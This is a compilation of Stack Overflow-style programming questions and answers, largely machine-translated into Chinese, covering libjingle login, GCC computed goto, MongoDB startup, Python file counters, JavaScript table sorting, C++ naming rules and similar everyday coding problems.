我正在使用 libjingle 编写一些代码，但第一步遇到了麻烦：登录到 XMPP 服务器。我的代码基于[goog 的示例代码](https://developers.google.com/talk/libjingle/login)和 pcp 示例代码。这段代码让我有点困惑，因为它似乎只运行一个线程，所以我意识到这是一个非常基本的问题。

无论如何，这是我的代码的主要内容：

```
 talk_base::PhysicalSocketServer ss;
    talk_base::AutoThread main_thread(&ss);
    buzz::Jid jid( xmppUsername + "@" + xmppHost );
    if (!jid.IsValid() || jid.node() == "")
        throw "Invalid JID. JIDs should be in the form user@domain" ;

    buzz::TlsOptions tls = buzz::TLS_ENABLED;

    buzz::XmppClientSettings xcs;
    xcs.set_user(jid.node());
    xcs.set_host(jid.domain());
    xcs.set_resource("pcp");
    xcs.set_pass(talk_base::CryptString(pass));
    xcs.set_allow_plain(true);
    xcs.set_server(talk_base::SocketAddress(xmppHost.c_str(), 5222));
    xcs.set_use_tls(tls);

    // Log in.
    CustomXmppPump pump;
    pump.client()->SignalLogInput.connect(&debug_log_, &DebugLog::Input);
    pump.client()->SignalLogOutput.connect(&debug_log_, &DebugLog::Output);
    pump.DoLogin(xcs, new XmppSocket(tls), 0);

    // Wait until login succeeds.
    std::vector<uint32> ids;
    ids.push_back(MSG_LOGIN_COMPLETE);
    ids.push_back(MSG_LOGIN_FAILED);
    if (MSG_LOGIN_FAILED == Loop(ids))
        throw "Failed to connect";

    ...

    // Runs the current thread until a message with the given ID is seen.
    uint32 Loop(const std::vector<uint32>& ids) {
      talk_base::Message msg;
      while (talk_base::Thread::Current()->Get(&msg)) {
        cout << "received message: " << msg.message_id << endl;
        if (msg.phandler == NULL) {
          if (std::find(ids.begin(), ids.end(), msg.message_id) != ids.end())
            return msg.message_id;
          std::cout << "orphaned message: " << msg.message_id << endl;
          continue;
        }
        cout << "1: " << msg.message_id <<  " : " << msg.ts_sensitive << endl;
        talk_base::Thread::Current()->Dispatch(&msg);
        cout << "2: " << msg.message_id << endl;
      }
      return 0;
    } 
```

运行时，它输出：

```
连接...
收到的消息：0
1:0:0
[004:722] 解析 PhysicalSocket::Connect 中的地址
2：0
收到的消息：0
1:0:0
2：0

```

而且只是挂起，很明显它卡在 Get(&msg) 调用上。

我应该注意我的服务器使用 DNS SRV 记录并且可以与其他客户端正常工作——也许我只需要自己解析 SRV？

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:21:01.493

T answer my own question:

According to [this bug](http://code.google.com/p/libjingle/issues/detail?id=386), and my own testing, dns SRV is not supported.

Moreover, according to [this bug](http://code.google.com/p/libjingle/issues/detail?id=294), the docs are very out of date, and the sample code I was using are not the recommended sample code.

Nevertheless, I was able to make some progress logging on by setting the domain in this call:

```
xcs.set_server(talk_base::SocketAddress(xmppHost.c_str(), 5222)); 
```

to the values of the actual server hosting the service. I thought I had tried this already, but it didn't work because I had actually changed this:

```
xcs.set_host(jid.domain()); 
```

Oops.

# c - GCC 计算 goto 和堆栈指针的值

> ID：12392454
> 
> 赞同：10
> 
> 时间：2012-09-12T16:16:51.950
> 
> 标签：c, gcc, stack, goto

在 GCC 中，您可以通过获取标签的地址（如）然后跳转到它（ ）来使用*计算的 goto*。[GCC手册](http://gcc.gnu.org/onlinedocs/gcc/Local-Labels.html)说你可以从函数的任何地方跳转到这个地址，只是从另一个函数跳转到它是未定义的。`void *addr = &&label``jump *addr`

当你跳转到代码时，它不能假设任何关于寄​​存器的值，所以大概它会从内存中重新加载它们。然而，堆栈指针的值也不一定是定义的，例如，您可以从声明额外变量的嵌套范围跳转。

问题是 GCC 如何设法将堆栈指针的值设置为正确的值（它可能太高或太低）？这与`-fomit-frame-pointer`（如果有的话）如何相互作用？

最后，关于从哪里跳转到标签的真正限制是什么？例如，您可能可以从中断处理程序中执行此操作。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-12T16:39:32.633

通常，当您有一个带有标签的函数时，gcc 需要确保您可以从函数中的任何间接 goto 跳转到该标签——因此它需要布局堆栈，以便确切的堆栈指针不会t 重要（所有内容都从帧指针索引），或者堆栈指针在所有这些上都是一致的。通常，这意味着它在函数启动时分配固定数量的堆栈空间，之后不再接触堆栈指针。因此，如果您有带有变量的内部范围，则空间将在函数开始时分配并在函数结束时释放，而不是在内部范围内。只有构造函数和析构函数（如果有）需要绑定到内部范围。

跳转到标签的唯一限制是您注意到的那个 - 您只能在包含标签的函数中执行此操作。不是来自任何其他函数或中断处理程序或任何其他东西的任何其他堆栈帧。

**编辑**

如果您希望能够从一个堆栈帧跳转到另一个堆栈帧，则需要使用 setjmp/longjmp 或类似的东西来展开堆栈。您可以将其与间接 goto 结合起来——例如：

```
if (target = (void *)setjmp(jmpbuf)) goto *target; 
```

这样你就可以`longjmp(jmpbuf, label_address);`从任何被调用的函数中调用来展开堆栈，然后跳转到标签。只要在`setjmp/longjmp`中断处理程序中工作，这也将在中断处理程序中工作。也取决于`sizeof(int) == sizeof(void *)`，但情况并非总是如此。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T19:26:36.777

I don't think that the fact that the goto's are computed add to the effect that it has on local variables. The lifetime of local variable starts from entering their declaration at or beyond their declaration and ends when the scope of the variable cannot be reached *in any way*. This includes all different sorts of control flow, in particular `goto` and `longjmp`. So all such variables are always safe, until the return from the function in which they are declared.

Labels in C are visible to the whole englobing function, so it makes not much difference if this is a computed `goto`. You could always replace a computed `goto` with a more or less involved `switch` statement.

One notable exception from this rule on local variables are variable length arrays, VLA. Since they *do* necessarily change the stack pointer, they have different rules. There lifetime ends as soon as you quit their block of declaration and `goto` and `longjmp` are not allowed into scopes after a declaration of a variably modified type.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:43:38.173

在函数序言中，即使使用 -fomit-frame-pointer，堆栈的当前位置也会保存在被调用者保存的寄存器中。

在下面的示例中，sp+4 存储在 r7 中，然后在结尾 (LBB0_3) 中恢复 (r7+4 -> r4; r4 -> sp)。正因为如此，您可以在函数中的任何位置跳转，在函数中的任何点增加堆栈，而不是搞砸堆栈。如果您跳出函数（通过跳转 *addr），您将跳过此结语并彻底搞砸堆栈。

也使用 alloca 的简短示例，它在堆栈上动态分配内存：

clang -arch armv7 -fomit-frame-pointer -c -S -O0 -o -stack.c

```
#include <alloca.h>

int foo(int sz, int jmp) {
    char *buf = alloca(sz);
    int rval = 0;

    if( jmp ) {
        rval = 1;
        goto done;
    }

    volatile int s = 2;

    rval = s * 5;

done:

    return rval;
} 
```

和拆卸：

```
_foo:
@ BB#0:
    push    {r4, r7, lr}
    add r7, sp, #4
    sub sp, #20
    movs    r2, #0
    movt    r2, #0
    str r0, [r7, #-8]
    str r1, [r7, #-12]
    ldr r0, [r7, #-8]
    adds    r0, #3
    bic r0, r0, #3
    mov r1, sp
    subs    r0, r1, r0
    mov sp, r0
    str r0, [r7, #-16]
    str r2, [r7, #-20]
    ldr r0, [r7, #-12]
    cmp r0, #0
    beq LBB0_2
@ BB#1:
    movs    r0, #1
    movt    r0, #0
    str r0, [r7, #-20]
    b   LBB0_3
LBB0_2:
    movs    r0, #2
    movt    r0, #0
    str r0, [r7, #-24]
    ldr r0, [r7, #-24]
    movs    r1, #5
    movt    r1, #0
    muls    r0, r1, r0
    str r0, [r7, #-20]
LBB0_3:
    ldr r0, [r7, #-20]
    subs    r4, r7, #4
    mov sp, r4
    pop {r4, r7, pc} 
```

# javascript - 如何跟随 YUI 驱动的动画离开屏幕或在项目上居中视口？

> ID：12392455
> 
> 赞同：1
> 
> 时间：2012-09-12T16:16:53.243
> 
> 标签：javascript, canvas, yui

我正在使用改编自 YUI3[文档示例](http://yuilibrary.com/yui/docs/anim/curve.html)的代码沿曲线路径为图形设置动画。

完整的画布尺寸故意非常大 - 肯定比大多数屏幕大 - 因此图形将很快耗尽视口空间并在屏幕上显示动画。

相反，我希望浏览器视口跟随或以图像为中心，以便它保持“在镜头中”。

有没有一种由 YUI 推动的方式来做到这一点？或者更简单的东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T17:11:39.720

你可以做这样的事情，基本上只是`canvas`通过考虑`canvas`与页面相关的坐标来确保视口始终跟踪对象。

```
function track(x,y, offsetX, offsetY){
    var trackX = x - (canvas.offsetLeft + offsetX);
        trackY = y - (canvas.offsetTop + offsetY);

    window.scrollTo(trackX, trackY);

} 
```

**[现场演示](http://jsfiddle.net/loktar/Q8Har/)**

​</p>

# jquery - 使用 jQuery 和 CSS 处理 Ruby on Rails 字符串变量的字符

> ID：12392456
> 
> 赞同：0
> 
> 时间：2012-09-12T16:17:10.710
> 
> 标签：jquery, css, ruby-on-rails, string

我想获取字符串的特定字符（存储为 ruby​​ on rails 全局变量）并修改它们的外观，同时通过 jquery 添加一点动画......这很容易实现，而无需调用变量并让 html 标签围绕特定字符我想抢；或者也许通过将包装的标签存储在变量中。但我不禁想到有一个更优雅的解决方案可以让我调用我的变量并针对这个特定的实例操作它......

这是一个可能有助于描述情况的示例。

我有一个全局变量“coName”，我可以在其中存储网站所在公司名称的字符串；使其易于在不同位置重复使用并为其他站点更新。使用一些简单的嵌入式 ruby​​ 可以很容易地在任何需要的地方调用该字符串......例如 h1 元素中的简单公司名称：

```
<h1><%=h coName %></h1> 
```

产生以下内容（如果 coName 值当然是“公司名称”）

```
<h1>Company Name</h1> 
```

现在我只是希望字符“mpany”是一种不同的颜色（也在这些字符上做一些 jQuery 淡入和淡出动画）和“名称”在不同的行上缩进几个宪章。

再次......这是微不足道的。如果我取消对变量的调用并将其标记为丑陋，例如：

```
<h1>Co<span>mpany</span><br /><span>Name</span></h1> 
```

然后我可以轻松地使用 CSS 和 jQuery 选择器来更改颜色、动画和缩进......但这并不优雅，可能不像 SEO 友好，或者像调用“coName”变量并修改它那样模块化。现在我正在使用 jQuery 中的子字符串方法，但在调用全局变量时还没有找到合适的解决方案。

我正在寻找网络专家可以提供的任何可能的解决方案。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:25:20.643

我想突出显示方法是您正在寻找的。

> ```
> highlight('You searched for: rails', ['for', 'rails'], :highlighter => '<em>\1</em>')
> # => You searched <em>for</em>: <em>rails</em> 
> ```

在这里阅读更多：http: [//api.rubyonrails.org/classes/ActionView/Helpers/TextHelper.html#method-i-highlight](http://api.rubyonrails.org/classes/ActionView/Helpers/TextHelper.html#method-i-highlight)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T16:48:11.560

使其对 SEO 友好的方法是在加载后使用 javascript 来操作 dom。像这样的东西：

```
$(document).ready(function(){
  $('h2').html(
    $('h2').html().replace(/mpany/, '<em>mpany</em>').replace(/Name/, '<em>Name</em>')
  );
}); 
```

# mongodb - MongoDB没有启动

> ID：12392457
> 
> 赞同：2
> 
> 时间：2012-09-12T16:17:15.833
> 
> 标签：mongodb

几天前我在我的ubuntu机器上安装了mongodb，我使用它没有任何问题。今天我不得不重新启动我的电脑。在那之后，mongo根本不会启动。它说：

```
Wed Sep 12 21:41:21 [initandlisten] exception in initAndListen: 10296 dbpath (/data/db/) does not exist, terminating 
```

几个小时前它工作正常，现在重新启动时一切都搞砸了。我在那里存储了很多重要的数据，我真的希望它不会全部丢失！我需要找到该数据并再次在该数据上运行 mongodb。我使用 pymongo 与 mongodb 交互。

我刚刚看到了配置文件，它将数据作为 dpath 存储在 /var/lib/mongod 中。现在我如何启动 mongodb 指定这个 dpath？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-12T16:48:07.603

您可以使用以下开关启动 mongodb。

```
mongod --dbpath /path/to/mongodb/data 
```

或者编辑配置文件。

```
/etc/mongod.conf 
```

将 dbpath 更改为您的数据目录。

```
dbpath = /path/to/mongodb/data 
```

您可以在配置文件中添加和更改更多内容，请[点击此处](http://docs.mongodb.org/manual/reference/glossary/#term-101)了解更多详细信息。

使用此命令创建您的目录树。

```
mkdir -p data/{db} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-12T17:11:45.543

使用以下命令启动 mongod：

```
sudo service mongodb start 
```

这会将您的系统配置文件作为参数传递给 mongod，这（如您所见）将导致它使用正确的路径。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T16:27:28.547

你需要一个路径来存储你的数据库。默认情况下是`/data/db/`. 如果它不存在，则必须先创建它

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-08-18T06:13:47.310

此错误的原因之一可能是您以自己的身份启动 mongodb。如果您使用*sudo*执行命令，则 mongodb 应该可以正常启动：

```
sudo mongod --dbpath /path/to/mongodb/data 
```

可以在 /etc/mongod.conf 等文件中找到 mongodb 数据的路径

# python - Python 检查文件是否存在，如果是则更新它否则创建它

> ID：12392459
> 
> 赞同：3
> 
> 时间：2012-09-12T16:17:20.863
> 
> 标签：python, file

我是 Python 新手 **我想检查文件名是否`checkzero.txt`存在** 如果它不存在，我想在 中写 1 `checkzero.txt`，否则我会增加它。

```
if os.path.exists("checkzero.txt"):

    f = open('checkzero.txt', 'r')
    counter = pickle.load(f)
    f.close()

    counter = counter + 1

    f = open('checkzero.txt', 'w')
    pickle.dump(counter, f)
    f.close()

else:
    f = open('checkzero.txt', 'w')
    pickle.dump(1, f)
    f.close() 
```

但是，如果我创建`checkzero.txt`为空文件，则会出错：

```
Traceback (most recent call last):
  File "FileBasics.py", line 8, in <module>
    counter = pickle.load(f)
  File "/usr/local/Cellar/python/2.7.2/lib/python2.7/pickle.py", line 1378, in load
    return Unpickler(file).load()
  File "/usr/local/Cellar/python/2.7.2/lib/python2.7/pickle.py", line 858, in load
    dispatch[key](self)
  File "/usr/local/Cellar/python/2.7.2/lib/python2.7/pickle.py", line 880, in load_eof
    raise EOFError
EOFError 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T16:28:04.410

您需要以`pickle`二进制模式打开文件：

```
f = open('checkzero.txt', 'rb') 
```

和

```
f = open('checkzero.txt', 'wb') 
```

但是为什么要使用`pickle`呢？

你可以得到同样的结果：

```
try:
    with open("checkzero.txt") as f:
        counter = int(f.read()) +1
except IOError:
    counter = 1
with open("checkzero.txt", "w") as f:
    f.write(str(counter)) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-12T16:52:24.270

这种更蟒蛇的方式怎么样？

```
try:
    with open('checkzero.txt', 'rb')as f:
        counter = pickle.load(f) + 1
except IOError:
    counter = 1

with open('checkzero.txt', 'wb') as f:
    pickle.dump(counter, f) 
```

尝试打开文件进行阅读。如果不存在设置默认值。

编辑：蒂姆回答了我的答案。他当然是对的。为什么要使用泡菜？

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-12T16:40:57.800

代码似乎工作正常，但如果文件最初存在但为空，我会收到您在评论中显示的错误。确保第一次运行代码时该文件不存在。

# asp.net-mvc - 在 MVC 中使用 Color Html 标签

> ID：12392466
> 
> 赞同：0
> 
> 时间：2012-09-12T16:17:49.850
> 
> 标签：asp.net-mvc

我的视图中有一个带有颜色类型的 html 输入标签

```
 <input type="color" id="Color" /> 
```

但是当我在操作方法中提交按钮时，我的模型中的颜色为空值

```
 public int Id { get; set; }

    public Color Color { get; set; }

    public string Name { get; set; } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T19:41:31.333

在编写 ViewModels 时，**请尽量保持您的属性类型尽可能简单。**我会将您的属性更改为简单`string`类型，并在您的表单中使用相同的名称以使模型绑定起作用。

```
public class SomeViewModel
{
  public int ID { set;get;}
  public string Color { set;get;}
  public string Name { set;get;}
} 
```

在视图中

```
<input type="color" name="Color" id="Color" /> 
```

请记住，并非所有浏览器都支持颜色[输入](http://www.html5tutorial.info/html5-color.php)。

# forms - cakephp 用地址预先填写电子邮件表格

> ID：12392467
> 
> 赞同：1
> 
> 时间：2012-09-12T16:17:53.220
> 
> 标签：forms, email, cakephp

我在页面上有一个电子邮件地址列表，我想添加该功能，以便在单击电子邮件地址时打开一个电子邮件表单，该电子邮件地址已预先填写在收件人字段中。我怎样才能做到这一点？

这是我已经拥有的表格；

```
<?php echo $this->Form->create('Email', array('action'=>'email_send.php'));
    echo $this->Form->input('email',array('label'=>'To: ')); //i want the email address i clicked on to be automatically placed here.
    echo $this->Form->input('message',array('type'=>'textarea','label'=>'Message: '));
echo $this->Form->end('Send'); ?> 
```

此外，如果有人对我将如何构建 email_send.php 文件以及传递变量和执行验证的最佳方法有任何提示，我也可以使用它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T08:04:01.603

在蛋糕中，您可以像这样实现它.. 显然可以进行改进，但这是一个示例：

### EmailsController.php（控制器）

```
function list_emails() {
    $this->set('emails', $this->EmailModel->find('all', array('fields' => 
                                                         array('id', 'email'))));

} 
```

### list_emails.ctp（查看）

```
echo '<ul>';
foreach($emails as $email) {
   echo '<li>' . $this->Html->link('Email: ' . $email['EmailModel']['email'],
          array('action'=>'process', $email['EmailModel']['id'])) . '</li>'; ?>
}
// generates a list of emails in the format:
// <a href="emails/process/1">Email: foo@foo.com</a>
echo '</ul>'; 
```

### EmailsController.php（控制器）

```
function process($email_id = null) {
    if(!$email_id) { 
        $this->redirect(array('action'=>'show_emails')); // no id specified 
    }
    // check if the form has been submit, otherwise, get the info for the view..

    $this->EmailModel->id = $email_id;
    $email = $this->EmailModel->read();
    $this->set('email', $email);   
} 
```

现在您可以在您的`process`视图中看到这些信息。

```
// echo $this->Form->input('email',array('label'=>'To: ','value'=>$email['EmailModel']['email'])); 
```

但这确实是很多工作。并且不要忘记值可以随时更改；让这有点毫无意义

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-13T05:26:55.470

试试这个代码：

在控制器中

```
$this->set('email',$email); //$email is the mail address from database 
```

在视野中

```
echo $this->Form->input('email',array('label'=>'To: ','value'=>$email)); 
```

或者

您可以将电子邮件放入 '$this->request->data' 数组中，它会自动填充到视图中，如下所示：您应该在控制器中添加它

```
$this->request->data['Email']['email'] = 'YOUR_EMAIL_FROM_DATABASE'; 
```

# php - 命令可以通过终端正常工作，但不能通过 shell_exec php

> ID：12392468
> 
> 赞同：1
> 
> 时间：2012-09-12T16:17:56.400
> 
> 标签：php, terminal, shell-exec

遇到了一个奇怪的问题，我现在用 lion 在我的 mac osx 上安装了 wav2png，并且在使用终端时可以正常工作，但是当我尝试使用 shell_exec 和 php 运行它时，如下所示

```
$wav2png = shell_exec("cd {$targetDir} && /usr/bin/wav2png --foreground-color=000000ff --background-color=00000000 -o example2.png f86150f88d.wav 2>&1");
echo "<pre>" . $wav2png . "</pre>"; 
```

我得到输出

```
dyld: Library not loaded: /opt/local/lib/libpng15.15.dylib
  Referenced from: /usr/bin/wav2png
  Reason: Incompatible library version: wav2png requires version 28.0.0 or later, but libpng15.15.dylib provides version 23.0.0 
```

找不到更新libpng的方法？？？

有什么建议为什么它可以通过终端正常工作而不是 shell_exec php？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:35:41.577

我认为问题出在 LD_LIBRARY_PATH 和/或一般的库路径中。

转到 shell 并输入

```
echo $LD_LIBRARY_PATH 
```

和

```
ldd /usr/bin/wav2png 
```

从 php 脚本中执行完全相同的操作（确保从这些命令中获取输出）并进行比较，我很确定您会找到答案。

# java - 使用对象标识符作为变量名

> ID：12392469
> 
> 赞同：3
> 
> 时间：2012-09-12T16:18:04.547
> 
> 标签：java, c++

就是想 ...

玩弄 C++，我发现如果你创建一个名为 的类`circle`，然后声明一个与类名完全相同的变量，编译器不会报错。例如：

```
class circle {
  // whatever it does in here
};

circle circle;   // is a valid statement, but
circle *circle = new circle();  // gives you a 'circle' is not a type complain 
```

事实证明，这适用于 string string = "string"; 也是。并用Java尝试过，也可能。我想它也可能适用于 C#，但我还没有尝试过。

谁能告诉我这背后的原因以及这是否是故意的功能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:30:46.463

n3337 9.1/2

> 类声明将类名引入声明它的范围，并将该名称的任何类、变量、函数或其他声明隐藏在封闭范围（3.3）中。如果在一个范围内声明了一个类名，其中还声明了一个同名的变量、函数或枚举器，那么当两个声明都在范围内时，只能使用详细类型说明符 (3.4\. 4）。

n3337 9.1/4

> [注意：类名的声明在类定义或详细类型说明符中看到标识符后立即生效。例如A类*A；首先将 A 指定为类的名称，然后将其重新定义为指向该类对象的指针的名称。这意味着必须使用详细的表单类 A 来引用该类。这种名字的艺术性可能会令人困惑，最好避免。——尾注]

所以。

```
class circle {
  // whatever it does in here
};

int main()
{
circle *circle;  // gives you a 'circle' is not a type complain
} 
```

编译得很好。

```
class circle {
  // whatever it does in here
};

int main()
{
circle *circle = new class circle();  // gives you a 'circle' is not a type complain
} 
```

编译也很好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:31:24.933

原因与动态分配无关。相反，它由以下代码说明：

```
// declaration    | initialisation
// ---------------+---------------
   circle *circle = new circle(); 
//                  ^ 
```

在标记点处`^`，声明已完成，并且`circle`在当前范围内被称为*变量*。因此，您正在尝试做`new variablename()`哪些行不通。

# javascript - «选择» 插件 jquery

> ID：12392472
> 
> 赞同：1
> 
> 时间：2012-09-12T16:18:12.670
> 
> 标签：javascript, jquery, jquery-chosen

[关于所选插件](https://github.com/julesjanssen/chosen/)，我有两个问题：

1.  我怎样才能看到右转的结果数组（['firstSelected'，'secondSelected'等]）？此时插件返回所有按索引排序的值。

2.  如何在所选列表的元素上监听鼠标事件？我想创建拖放列表。所有事件都被插件阻止。

# java - 正则表达式匹配任何合法的 java 函数声明的格式

> ID：12392473
> 
> 赞同：3
> 
> 时间：2012-09-12T16:18:13.083
> 
> 标签：java, regex

正则表达式是我的一个弱点。

我正在寻找一种正则表达式或其他技术，可以让我读取任意字符串并确定它是否是有效的 java 函数。

好的：

```
public void foo()
void foo()
static protected List foo()
static List foo() 
```

坏的：

```
public List myList = new List() 
```

代码：

```
For String line : lines.
{    
     If(line.matches("(public|protected|private)*(/w)*(")
} 
```

如果它是有效的java函数，是否有这样的正则表达式会返回true？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-12T17:50:00.340

```
/^\s*(public|private|protected)?\s+(static)?\s+\w+\s+\w+\s*\(.*?\)\s*$/m 
```

火柴：

*   行首 <^>
*   任意空格 <\s*>
*   可选范围 <(public|private|protected)?>
*   至少一个空格 <\s+>
*   可选关键字 static <(static)?>
*   至少一个空格 <\s+>
*   一个 java 标识符（你应该希望它是一个类名或文字）<\w+>
*   至少一个空格 <\s+>
*   一个 java 标识符（函数名）<\w+>
*   打开括号 <(>
*   任意参数（这里没有检查，因为大量的混乱）<.*?>
    *   做惰性匹配
*   关闭括号 <)>
*   任意空格 <\s*>
*   行结束

这远未完成，但应该满足您的需求。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-12T16:44:19.577

取决于您需要它有多严格，因为它作为正则表达式可能会变得相当复杂。

Java 中方法声明的语法如下所示：

[Java 方法声明 BNF](http://cui.unige.ch/isi/bnf/JAVA/method_declaration.html)：

```
method_declaration 
    ::= 
    { modifier } type identifier 
    "(" [ parameter_list ] ")" { "[" "]" } 
    ( statement_block | ";" ) 
```

并且您必须检查诸如具有多个修饰符但不是重复的相同修饰符或多个范围修饰符之类的事情，以及类型和标识符之类的其他事情不是Java关键字之一。开始变得毛茸茸...我怀疑您是否想编写自己的 Java 解析器。

# javascript - Javascript 排序字符串或数字

> ID：12392476
> 
> 赞同：0
> 
> 时间：2012-09-12T16:18:19.707
> 
> 标签：javascript, jquery, sorting

## 编辑：Pete 提供了一个非常好的解决方案，当字段包含数字时有效，但是我也需要能够对字符串进行排序 - 有什么想法吗？

我正在尝试编写一个 javascript 排序算法，该算法将根据单击的列对表进行排序 - 我知道这是半重新发明轮子，但设计太复杂，我无法尝试插入其他插件等。

有些列是文本，有些列是数字。

单击列调用：sort(X,Y)。X 是列号，因此我们知道要比较哪些单元格进行排序。Y 是模式，即升序或降序。

排序函数的代码是：

```
function sort(field, mode) {
var tabrows = 0;
$(".data tr").each(function() { if($(this).hasClass("hdr")) { } else {tabrows++;} });   
var swapped;
do {
        swapped = false;
        for (var i=0;i< tabrows; i++) {

            var j = i + 3;
            var k = i + 4;  

            var row1 = $(".data tr:nth-child("+j+")");
            var row2 = $(".data tr:nth-child("+k+")");

            var field1 = row1.find("td:eq("+field+")").text();      
            var field2 = row2.find("td:eq("+field+")").text();

            if(shouldswap(field1, field2, mode)) {
                swaprows(row1, row2);
                swapped = true;
            }
        }
    } while (swapped);
} 
```

shouldswap 函数如下：

```
function shouldswap(field1, field2,mode) {

    if(field1 > field2) {
            if(mode==1) {   
                return true;
            } else {
                return false;
            }   
    }

    return false;

} 
```

swaprows 函数的代码：

```
function swaprows(row1, row2) {
      row2.insertBefore(row1);
} 
```

谁能明白为什么这会导致浏览器冻结/锁定。我已经为此工作了很长一段时间，所以我认为一双新的眼睛可能会指出一些愚蠢的事情！任何帮助表示赞赏:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:51:14.913

问题可能是您多次调用 jQuery 构造函数并对其执行繁重的操作（例如，使用`.find()`复杂的选择器）。因此，您的功能很慢，这可能就是问题所在。

好消息是 JavaScript 有一个 QuickSort（一种非常快速的排序功能）的本机实现，它可能会满足您的需求。当结合减少昂贵的调用时，您的代码最终应该会变得更加高效。我会将您的代码更改为如下所示：

```
var sortByField = function(field, mode) {
    var numExp = /^-?\d*\.?\d+$/;
    var $rows = $(".data tr:not(.hdr)"), $table = $(".data");
    $rows.each(function () {
        this.fieldVal = $(this).find("td:eq("+field+")").text();
        if(numExp.test(this.fieldVal)) { //if field is numeric, convert it to a number
            this.fieldVal = +this.fieldVal;
        }
    }).sort(function (a, b) {
        if (mode === 1) {
            return (a.fieldVal > b.fieldVal) ? -1 : 1;    
        }    
        return (a.fieldVal < b.fieldVal) ? -1 : 1;
    }).detach().each(function () {
        $(this).appendTo($table);
    });
}; 
```

这不适用于一页上的多个表（因为它假定所有内容都在同一个表上）。所以如果你想这样做，你应该传入表格或表格选择器作为参数。但这很容易解决。你可以在这里看到我的解决方案：

[http://jsfiddle.net/r8wtK/](http://jsfiddle.net/r8wtK/)（更新）

它应该比您的代码更有效，并且应该减少相当多的“冻结”（甚至完全）。

**更新：**

OP 指出，某些字段可能包含字符串。对数字进行字符串比较是不好的，因为它会返回字典顺序（例如`"10" < "2"`）。所以我添加了一个测试，在进行排序之前查看数据是否显示为数字。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:44:24.797

可能是`i`为了获得行索引，您要添加 3 和 4 吗？因此，当`i`到达时`(tabrows-1)`，它似乎将尝试访问索引为`(tabrows+2)`and的行`(tabrows+3)`。如果我正确理解您的逻辑，则这些超出范围，因此, `row1`,`row2`将是空的。因此，如果您在 中，我认为这将使您的算法尝试交换这两个不存在的行并继续比较无穷大。这是有道理的，还是我误解了你的逻辑？`field1``field2``mode==1`

如果是这种情况，我认为您只需将 for 循环更改为：

```
for (var i=0;i< tabrows-4; i++) {
     // your code
} 
```

无论如何，将 3 加到 j 和 4 加到 k 的目的是什么？您是否不想比较顶部的 3 行数据？

# c++ - 从 Microsoft Visual C++ 2010 中删除的运行选项

> ID：12392488
> 
> 赞同：0
> 
> 时间：2012-09-12T16:18:55.380
> 
> 标签：c++, visual-c++, compilation, visual-studio-2010

我想我不小心更改了我的 MSVC 2010 编译器中的一些设置，现在我找不到编译和执行选项。此外，当我点击标签按钮进行缩进时，会出现一个箭头（->）。我想知道怎么了？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:42:57.450

使用工具菜单“导入和导出设置”，然后选择“重置所有设置”将设置重置为默认值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T18:26:01.547

要重置编辑器错误，只需`Ctrl+Shift+8`从文本编辑器本身内部点击 , 。这是可切换的选项，可用于查看空白。有时有用！

# c# - 如何在 C# 中找到一个矩阵是另一个矩阵的子矩阵？

> ID：12392490
> 
> 赞同：-1
> 
> 时间：2012-09-12T16:19:07.657
> 
> 标签：c#

我想找到一个给定的矩阵是另一个的子矩阵。

我已经尝试过下面的代码，但我不确定它是否会起作用：-

```
for (int i = 0; i < a.length - b.length + 1; i++) {
    for (int j = 0; j < a[0].length - b[0].length + 1; j++) {
        boolean submatrix = true; // at start we assume we have a submatrix
        for (int k = 0; k < b.length; ++k) {
            for (int l = 0; l < b[0].length; ++l) {
                if (a[i + k][j + l] == b[k][l]) {
                    Console.WriteLine("a[" + (i + k) + "][" + (j + l) + "] = b[" + k + "][" + l + "]");
                } else {
                    submatrix = false; // we found inequality, so it's not a submatrix
                }
            }
        }
        if (submatrix) {
            Console.WriteLine("Found subatrix at " + i + "," + j + ".");
        }
    }
} 
```

请建议？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:38:35.197

您建议的方法是正确的，我已经修复了一些语法和控制流问题。

需要指出的是，这种方法只对检测**二维矩阵**的子矩阵有用，对任何维度矩阵都没有。

我假设数据类型是 的锯齿状数组`int`，尽管它可以很容易地更改。

```
private static bool IsSubMatrix(int[][] a, int[][] b)
{
     for (int i = 0; i < a.Length - b.Length + 1; i++)
     {
         for (int j = 0; j < a[0].Length - b[0].Length + 1; j++)
         {
              bool found = true;
              for (int k = 0; k < b.Length; ++k)
              {
                  for (int l = 0; l < b[0].Length; ++l)
                  {
                      if (a[i + k][j + l] != b[k][l])
                      {
                          found = false;
                          break;
                      }
                  }
                  if (!found) break;
              }
              if (found) return true;
          }
      }          
      return false;
 } 
```

这可能也不是最快的实现。

# java - 可以不在 JFileChooser 的文件类型组合框中添加类型通配符吗？

> ID：12392491
> 
> 赞同：1
> 
> 时间：2012-09-12T16:19:14.307
> 
> 标签：java, swing, jfilechooser

